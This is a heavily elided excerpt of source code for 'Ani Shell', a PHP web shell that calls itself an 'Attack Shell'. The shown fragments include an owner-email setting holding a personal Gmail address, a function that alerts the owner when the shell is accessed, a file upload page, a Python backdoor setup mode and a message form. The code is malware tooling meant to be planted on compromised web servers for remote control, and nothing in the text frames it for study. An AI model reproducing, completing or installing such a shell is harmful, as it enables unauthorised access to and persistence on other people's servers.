...
[]---------------------Ani Shell----------------------
[]====================================================
[]>>>>>>>>> c0d3d and cr34t3d by lionaneesh <<<<<<<<<<
[]====================================================
...
$ownerEmail 		= "franzwagner.str@gmail.com"; // Change this to your email , This email is used to deliver tracebacks about your shell
...
function sendLoginAlert()
{
    ...
    {
        $subject = "Shell Accessed -- Attack Shell --";
        $message = "
Hey Owner ,

        Your Attack Shell located at $url was accessed by $accesedIp
...
[]
[]
[]  <font color="rgb(0, 255, 0)">Code</font>
[]      <font color="rgb(0, 255, 0)">Hack</font>
[]          <font color="rgb(0, 255, 0)">Live</font>
[]
[]
</b>
</font>
...
else if(isset($_GET['upload']))
{
    ...
    <tr>
        <th class="header" colspan="1" width="50px">Upload (From your computer)</th>
    </tr>
    <tr>
         <td>
    ...
    isset($_POST['mode']))
    {
        ...
        if($_POST['mode'] == "Python")
        {
            ...
            if($fd != FALSE)
            {
                ...
                {
                        echo "<p class='alert_green'>Process Found Running! Backdoor Setup Completed! :D</p>";
                }
                else
                {
    ...
    else
    {
        ...
        <form method="GET">
            ...
            <table id="margins">
                ...
                <tr>
                    <td colspan="2">
                        <textarea name="message" cols="110" rows="10" class="cmd">Attack Shell Rocks!!</textarea>
                    </td>
                </tr>
